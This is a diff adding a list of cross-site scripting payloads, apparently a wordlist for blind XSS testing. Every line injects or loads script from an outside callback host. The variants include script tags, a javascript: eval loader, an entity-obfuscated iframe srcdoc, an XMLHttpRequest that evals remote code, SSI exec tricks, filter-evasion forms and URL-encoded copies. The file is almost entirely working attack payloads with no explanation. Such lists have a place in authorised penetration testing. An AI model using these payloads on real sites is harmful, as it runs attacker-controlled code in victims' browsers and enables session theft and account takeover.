@@ -1,0 +1,28 @@
+"><script src=https://glc.xss.ht></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://glc.xss.ht\';document.body.appendChild(a)')
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;glc.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//glc.xss.ht");a.send();</script>
+<script>$.getScript("//glc.xss.ht")</script>
+<SCRIPT SRC=https://glc.xss.ht></SCRIPT>
+<SCRIPT/XSS SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT SRC=https://glc.xss.ht?<B>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=https://glc.xss.ht></SCRIPT>'"-->
+<SCRIPT a=">" SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT a=`>` SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://glc.xss.ht"></SCRIPT>
+%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fglc.xss.ht%3E%3C%2Fscript%3E
+javascript%3Aeval('var%20a%3Ddocument.createElement(%5C'script%5C')%3Ba.src%3D%5C'https%3A%2F%2Fglc.xss.ht%5C'%3Bdocument.body.appendChild(a)')%0A
+%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D%3Ba%3Dnew%20XMLHttpRequest()%3Ba.addEventListener(%22load%22%2C%20b)%3Ba.open(%22GET%22%2C%20%22%2F%2Fglc.xss.ht%22)%3Ba.send()%3B%3C%2Fscript%3E%0A
+%3Cscript%3E%24.getScript(%22%2F%2Fglc.xss.ht%22)%3C%2Fscript%3E%0A
+%3CSCRIPT%20SRC%3Dhttps%3A%2F%2Fglc.xss.ht%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%2FXSS%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%20SRC%3Dhttps%3A%2F%2Fglc.xss.ht%3F%3CB%3E%0A
+%3C!--%23exec%20cmd%3D%22%2Fbin%2Fecho%20'%3CSCRIPT%20SRC'%22--%3E%3C!--%23exec%20cmd%3D%22%2Fbin%2Fecho%20'%3Dhttps%3A%2F%2Fglc.xss.ht%3E%3C%2FSCRIPT%3E'%22--%3E%0A
+%3CSCRIPT%20a%3D%22%3E%22%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%20a%3D%22%3E%22%20''%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%20%22a%3D'%3E'%22%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%20%22a%3D'%3E'%22%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%20a%3D%60%3E%60%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
+%3CSCRIPT%3Edocument.write(%22%3CSCRI%22)%3B%3C%2FSCRIPT%3EPT%20SRC%3D%22https%3A%2F%2Fglc.xss.ht%22%3E%3C%2FSCRIPT%3E%0A
